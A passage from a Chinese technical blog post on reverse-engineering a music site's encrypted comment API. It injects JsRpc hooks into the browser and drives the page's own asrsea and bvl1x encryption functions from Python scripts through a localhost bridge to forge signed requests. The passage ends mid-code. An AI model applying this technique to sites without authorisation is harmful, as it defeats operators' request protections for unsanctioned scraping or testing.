result.get(<span class="string">&#x27;encSecKey&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(encText)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(encSecKey))</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;params&#x27;</span>: encText,</span><br><span class="line">    <span class="string">&#x27;encSecKey&#x27;</span>: encSecKey,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(</span><br><span class="line">    url=<span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">    params=params,</span><br><span class="line">    headers=headers,</span><br><span class="line">    data=data</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line">pprint.pprint(response.json())</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071113594.png" alt="img"> </p><h1 id="JsRpc调用"><a href="#JsRpc调用" class="headerlink" title="JsRpc调用"></a>JsRpc调用</h1><p>可以看到，在后续定位到函数后，各种扣取代码，函数嵌套函数，为整个分析的过程带来了很大的麻烦。</p><p>那可不可以不扣取代码就实现获取评论的功能呢？</p><p>JSRPC刚好就可以实现该功能。</p><h2 id="加密函数参数分析"><a href="#加密函数参数分析" class="headerlink" title="加密函数参数分析"></a>加密函数参数分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.asrsea(JSON.stringify(i6c), bvl1x([&quot;流泪&quot;, &quot;强&quot;]), bvl1x(Rj5o.md), bvl1x([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;]));</span><br></pre></td></tr></table></figure><p>有4个参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JSON.stringify(i6c) </span><br><span class="line">bvl1x([&quot;流泪&quot;, &quot;强&quot;])</span><br><span class="line">bvl1x(Rj5o.md)</span><br><span class="line">bvl1x([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;])</span><br></pre></td></tr></table></figure><p>上面4个参数，对应某次的请求的值，分别如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;4&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1713198658380&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;</span><br><span class="line">&#x27;010001&#x27;</span><br><span class="line">&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span><br><span class="line">&#x27;0CoJUm6Qyw8W8jud&#x27;</span><br></pre></td></tr></table></figure><p>可以看到后三个参数是先调用了<strong>bvl1x方法</strong>的，所以在hook加密函数之前，要先对他进行hook。</p><p>（貌似这后三个值不会变化，可以写死，但这块为了验证RPC，还是借用他来实现）</p><h3 id="bvl1x方法"><a href="#bvl1x方法" class="headerlink" title="bvl1x方法"></a>bvl1x方法</h3><p>1、定义全局导出函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.p = bvl1x</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117151.png" alt="image.png"> </p><p>2、配置RPC环境</p><p>（1）注入JSenv环境</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117201.png" alt="img"> </p><p>（2）运行exe，浏览器（客户端）和 本地（服务端）建立连接</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071118893.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 注入环境后连接通信</span><br><span class="line">var demo = new Hlclient(&quot;ws://127.0.0.1:12080/ws?group=zzz&amp;name=hlg&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071118594.png" alt="image.png"> </p><p>3、在前端注入JS代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hlg1</span>(<span class="params">data1</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">p</span>(data1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hacker1&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>)&#123;</span><br><span class="line">  res=<span class="title function_">hlg1</span>(param[<span class="string">&quot;data1&quot;</span>]);</span><br><span class="line">  <span class="title function_">resolve</span>(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071118541.png" alt="image.png"> </p><p>4、python脚本如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> jsonpath</span><br><span class="line"></span><br><span class="line">jscode1 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    s = p([&quot;</span>流泪<span class="string">&quot;, &quot;</span>强<span class="string">&quot;]);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">jscode2 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    var Rj5o_md = [&quot;</span>色<span class="string">&quot;, &quot;</span>流感<span class="string">&quot;, &quot;</span>这边<span class="string">&quot;, &quot;</span>弱<span class="string">&quot;, &quot;</span>嘴唇<span class="string">&quot;, &quot;</span>亲<span class="string">&quot;, &quot;</span>开心<span class="string">&quot;, &quot;</span>呲牙<span class="string">&quot;, &quot;</span>憨笑<span class="string">&quot;, &quot;</span>猫<span class="string">&quot;, &quot;</span>皱眉<span class="string">&quot;, &quot;</span>幽灵<span class="string">&quot;, &quot;</span>蛋糕<span class="string">&quot;, &quot;</span>发怒<span class="string">&quot;, &quot;</span>大哭<span class="string">&quot;, &quot;</span>兔子<span class="string">&quot;, &quot;</span>星星<span class="string">&quot;, &quot;</span>钟情<span class="string">&quot;, &quot;</span>牵手<span class="string">&quot;, &quot;</span>公鸡<span class="string">&quot;, &quot;</span>爱意<span class="string">&quot;, &quot;</span>禁止<span class="string">&quot;, &quot;</span>狗<span class="string">&quot;, &quot;</span>亲亲<span class="string">&quot;, &quot;</span>叉<span class="string">&quot;, &quot;</span>礼物<span class="string">&quot;, &quot;</span>晕<span class="string">&quot;, &quot;</span>呆<span class="string">&quot;, &quot;</span>生病<span class="string">&quot;, &quot;</span>钻石<span class="string">&quot;, &quot;</span>拜<span class="string">&quot;, &quot;</span>怒<span class="string">&quot;, &quot;</span>示爱<span class="string">&quot;, &quot;</span>汗<span class="string">&quot;, &quot;</span>小鸡<span class="string">&quot;, &quot;</span>痛苦<span class="string">&quot;, &quot;</span>撇嘴<span class="string">&quot;, &quot;</span>惶恐<span class="string">&quot;, &quot;</span>口罩<span class="string">&quot;, &quot;</span>吐舌<span class="string">&quot;, &quot;</span>心碎<span class="string">&quot;, &quot;</span>生气<span class="string">&quot;, &quot;</span>可爱<span class="string">&quot;, &quot;</span>鬼脸<span class="string">&quot;, &quot;</span>跳舞<span class="string">&quot;, &quot;</span>男孩<span class="string">&quot;, &quot;</span>奸笑<span class="string">&quot;, &quot;</span>猪<span class="string">&quot;, &quot;</span>圈<span class="string">&quot;, &quot;</span>便便<span class="string">&quot;, &quot;</span>外星<span class="string">&quot;, &quot;</span>圣诞<span class="string">&quot;]</span></span><br><span class="line"><span class="string">    s = p(Rj5o_md);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">jscode3 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    s = p([&quot;</span>爱心<span class="string">&quot;, &quot;</span>女孩<span class="string">&quot;, &quot;</span>惊恐<span class="string">&quot;, &quot;</span>大笑<span class="string">&quot;]);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/execjs&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">des_enc</span>():</span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode1</span><br><span class="line">    &#125;</span><br><span class="line">    res1 = requests.<span class="title function_">post</span>(url, data=data1)</span><br><span class="line">    <span class="title function_">print</span>(res1.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line">    data2 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode2</span><br><span class="line">    &#125;</span><br><span class="line">    res2 = requests.<span class="title function_">post</span>(url, data=data2)</span><br><span class="line">    <span class="title function_">print</span>(res2.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line">    data3 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode3</span><br><span class="line">    &#125;</span><br><span class="line">    res3 = requests.<span class="title function_">post</span>(url, data=data3)</span><br><span class="line">    <span class="title function_">print</span>(res3.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">des_enc</span>()</span><br></pre></td></tr></table></figure><p> 运行后，获得三个参数的值。<img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1713257229122-ed7036e6-5a86-43b5-ad3e-8cc13efeb688.png" alt="img"></p><h2 id="加密函数调用"><a href="#加密函数调用" class="headerlink" title="加密函数调用"></a>加密函数调用</h2><p>1、前端注入JS代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hlg2</span>(<span class="params">data2</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> param2 = <span class="string">&quot;010001&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> param3 = <span class="string">&quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&quot;</span></span><br><span class="line">  <span class="keyword">var</span> param4 = <span class="string">&quot;0CoJUm6Qyw8W8jud&quot;</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">asrsea</span>(data2,param2,param3,param4))</span><br><span class="line">  obj = <span class="title function_">asrsea</span>(data2,param2,param3,param4)</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hacker2&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>)&#123;</span><br><span class="line">  res=<span class="title function_">hlg2</span>(param[<span class="string">&quot;data2&quot;</span>]);</span><br><span class="line">  <span class="title function_">resolve</span>(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117273.png" alt="img"> </p><p>2、python脚本如下</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">param1 = <span class="string">&#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;4&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1713198658380&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">enc</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(&#123;<span class="string">&quot;data2&quot;</span>: param1&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> json.<span class="title function_">loads</span>(res.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">enc</span>())</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071118130.png" alt="image.png"> </p><p>3、但上面代码是在前端中将参数写死的，这块可以动态调用Python脚本中计算的值。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hlg2</span>(<span class="params">data2,param2,param3,param4</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">asrsea</span>(data2,param2,param3,param4))</span><br><span class="line">  obj = <span class="title function_">asrsea</span>(data2,param2,param3,param4)</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hacker2&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>)&#123;</span><br><span class="line">  res=<span class="title function_">hlg2</span>(param[<span class="string">&quot;data2&quot;</span>],param[<span class="string">&quot;param2&quot;</span>],param[<span class="string">&quot;param3&quot;</span>],param[<span class="string">&quot;param4&quot;</span>]);</span><br><span class="line">  <span class="title function_">resolve</span>(res);</span><br><span class="line">&#125;)</span><br><span class="line">def <span class="title function_">enc</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(&#123;<span class="string">&quot;data2&quot;</span>: param1, <span class="string">&quot;param2&quot;</span>: param2, <span class="string">&quot;param3&quot;</span>: param3, <span class="string">&quot;param4&quot;</span>: param4&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> json.<span class="title function_">loads</span>(res.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">enc</span>())</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1713261612399-d6afa6d9-a91e-47b0-ad2a-3eaaf955d680.png" alt="img"></p><h2 id="完整代码："><a href="#完整代码：" class="headerlink" title="完整代码："></a>完整代码：</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">jscode1 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    s = p([&quot;</span>流泪<span class="string">&quot;, &quot;</span>强<span class="string">&quot;]);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">jscode2 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    var Rj5o_md = [&quot;</span>色<span class="string">&quot;, &quot;</span>流感<span class="string">&quot;, &quot;</span>这边<span class="string">&quot;, &quot;</span>弱<span class="string">&quot;, &quot;</span>嘴唇<span class="string">&quot;, &quot;</span>亲<span class="string">&quot;, &quot;</span>开心<span class="string">&quot;, &quot;</span>呲牙<span class="string">&quot;, &quot;</span>憨笑<span class="string">&quot;, &quot;</span>猫<span class="string">&quot;, &quot;</span>皱眉<span class="string">&quot;, &quot;</span>幽灵<span class="string">&quot;, &quot;</span>蛋糕<span class="string">&quot;, &quot;</span>发怒<span class="string">&quot;, &quot;</span>大哭<span class="string">&quot;, &quot;</span>兔子<span class="string">&quot;, &quot;</span>星星<span class="string">&quot;, &quot;</span>钟情<span class="string">&quot;, &quot;</span>牵手<span class="string">&quot;, &quot;</span>公鸡<span class="string">&quot;, &quot;</span>爱意<span class="string">&quot;, &quot;</span>禁止<span class="string">&quot;, &quot;</span>狗<span class="string">&quot;, &quot;</span>亲亲<span class="string">&quot;, &quot;</span>叉<span class="string">&quot;, &quot;</span>礼物<span class="string">&quot;, &quot;</span>晕<span class="string">&quot;, &quot;</span>呆<span class="string">&quot;, &quot;</span>生病<span class="string">&quot;, &quot;</span>钻石<span class="string">&quot;, &quot;</span>拜<span class="string">&quot;, &quot;</span>怒<span class="string">&quot;, &quot;</span>示爱<span class="string">&quot;, &quot;</span>汗<span class="string">&quot;, &quot;</span>小鸡<span class="string">&quot;, &quot;</span>痛苦<span class="string">&quot;, &quot;</span>撇嘴<span class="string">&quot;, &quot;</span>惶恐<span class="string">&quot;, &quot;</span>口罩<span class="string">&quot;, &quot;</span>吐舌<span class="string">&quot;, &quot;</span>心碎<span class="string">&quot;, &quot;</span>生气<span class="string">&quot;, &quot;</span>可爱<span class="string">&quot;, &quot;</span>鬼脸<span class="string">&quot;, &quot;</span>跳舞<span class="string">&quot;, &quot;</span>男孩<span class="string">&quot;, &quot;</span>奸笑<span class="string">&quot;, &quot;</span>猪<span class="string">&quot;, &quot;</span>圈<span class="string">&quot;, &quot;</span>便便<span class="string">&quot;, &quot;</span>外星<span class="string">&quot;, &quot;</span>圣诞<span class="string">&quot;]</span></span><br><span class="line"><span class="string">    s = p(Rj5o_md);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">jscode3 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    s = p([&quot;</span>爱心<span class="string">&quot;, &quot;</span>女孩<span class="string">&quot;, &quot;</span>惊恐<span class="string">&quot;, &quot;</span>大笑<span class="string">&quot;]);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/execjs&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">des_enc</span>():</span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode1</span><br><span class="line">    &#125;</span><br><span class="line">    res1 = requests.<span class="title function_">post</span>(url, data=data1)</span><br><span class="line"></span><br><span class="line">    data2 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode2</span><br><span class="line">    &#125;</span><br><span class="line">    res2 = requests.<span class="title function_">post</span>(url, data=data2)</span><br><span class="line"></span><br><span class="line">    data3 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode3</span><br><span class="line">    &#125;</span><br><span class="line">    res3 = requests.<span class="title function_">post</span>(url, data=data3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res1, res2, res3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res1, res2, res3 = <span class="title function_">des_enc</span>()</span><br><span class="line">param2 = json.<span class="title function_">loads</span>(res1.<span class="property">text</span>)[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">param3 = json.<span class="title function_">loads</span>(res2.<span class="property">text</span>)[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">param4 = json.<span class="title function_">loads</span>(res3.<span class="property">text</span>)[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line"></span><br><span class="line">param1 = <span class="string">&#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;4&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1713198658380&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">enc</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(&#123;<span class="string">&quot;data2&quot;</span>: param1, <span class="string">&quot;param2&quot;</span>: param2, <span class="string">&quot;param3&quot;</span>: param3, <span class="string">&quot;param4&quot;</span>: param4&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> json.<span class="title function_">loads</span>(res.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">enc</span>())</span><br></pre></td></tr></table></figure><h1 id="autodecoder联动"><a href="#autodecoder联动" class="headerlink" title="autodecoder联动"></a>autodecoder联动</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">加密函数：</span><br><span class="line"><span class="keyword">var</span> bKL3x = <span class="variable language_">window</span>.<span class="title function_">asrsea</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(i1x), <span class="title function_">bvl3x</span>([<span class="string">&quot;流泪&quot;</span>, <span class="string">&quot;强&quot;</span>]), <span class="title function_">bvl3x</span>(<span class="title class_">Rj6</span>d.<span class="property">md</span>), <span class="title function_">bvl3x</span>([<span class="string">&quot;爱心&quot;</span>, <span class="string">&quot;女孩&quot;</span>, <span class="string">&quot;惊恐&quot;</span>, <span class="string">&quot;大笑&quot;</span>]));</span><br></pre></td></tr></table></figure><p>1、前端注入的JS进行参数调用，可以修改为：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">bvl3x</span> = bvl3x</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">Rj6d_md</span> = [<span class="string">&quot;色&quot;</span>, <span class="string">&quot;流感&quot;</span>, <span class="string">&quot;这边&quot;</span>, <span class="string">&quot;弱&quot;</span>, <span class="string">&quot;嘴唇&quot;</span>, <span class="string">&quot;亲&quot;</span>, <span class="string">&quot;开心&quot;</span>, <span class="string">&quot;呲牙&quot;</span>, <span class="string">&quot;憨笑&quot;</span>, <span class="string">&quot;猫&quot;</span>, <span class="string">&quot;皱眉&quot;</span>, <span class="string">&quot;幽灵&quot;</span>, <span class="string">&quot;蛋糕&quot;</span>, <span class="string">&quot;发怒&quot;</span>, <span class="string">&quot;大哭&quot;</span>, <span class="string">&quot;兔子&quot;</span>, <span class="string">&quot;星星&quot;</span>, <span class="string">&quot;钟情&quot;</span>, <span class="string">&quot;牵手&quot;</span>, <span class="string">&quot;公鸡&quot;</span>, <span class="string">&quot;爱意&quot;</span>, <span class="string">&quot;禁止&quot;</span>, <span class="string">&quot;狗&quot;</span>, <span class="string">&quot;亲亲&quot;</span>, <span class="string">&quot;叉&quot;</span>, <span class="string">&quot;礼物&quot;</span>, <span class="string">&quot;晕&quot;</span>, <span class="string">&quot;呆&quot;</span>, <span class="string">&quot;生病&quot;</span>, <span class="string">&quot;钻石&quot;</span>, <span class="string">&quot;拜&quot;</span>, <span class="string">&quot;怒&quot;</span>, <span class="string">&quot;示爱&quot;</span>, <span class="string">&quot;汗&quot;</span>, <span class="string">&quot;小鸡&quot;</span>, <span class="string">&quot;痛苦&quot;</span>, <span class="string">&quot;撇嘴&quot;</span>, <span class="string">&quot;惶恐&quot;</span>, <span class="string">&quot;口罩&quot;</span>, <span class="string">&quot;吐舌&quot;</span>, <span class="string">&quot;心碎&quot;</span>, <span class="string">&quot;生气&quot;</span>, <span class="string">&quot;可爱&quot;</span>, <span class="string">&quot;鬼脸&quot;</span>, <span class="string">&quot;跳舞&quot;</span>, <span class="string">&quot;男孩&quot;</span>, <span class="string">&quot;奸笑&quot;</span>, <span class="string">&quot;猪&quot;</span>, <span class="string">&quot;圈&quot;</span>, <span class="string">&quot;便便&quot;</span>, <span class="string">&quot;外星&quot;</span>, <span class="string">&quot;圣诞&quot;</span>]</span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;enc&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>)&#123;</span><br><span class="line">  res=<span class="title function_">asrsea</span>(param,<span class="title function_">bvl3x</span>([<span class="string">&quot;流泪&quot;</span>, <span class="string">&quot;强&quot;</span>]), <span class="title function_">bvl3x</span>(<span class="title class_">Rj6</span>d_md), <span class="title function_">bvl3x</span>([<span class="string">&quot;爱心&quot;</span>, <span class="string">&quot;女孩&quot;</span>, <span class="string">&quot;惊恐&quot;</span>, <span class="string">&quot;大笑&quot;</span>]));</span><br><span class="line">  <span class="title function_">resolve</span>(<span class="string">&quot;params=&quot;</span>+<span class="built_in">encodeURIComponent</span>(res.<span class="property">encText</span>)+<span class="string">&quot;&amp;encSecKey=&quot;</span>+res.<span class="property">encSecKey</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>2、Python代码也可以修改如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param = <span 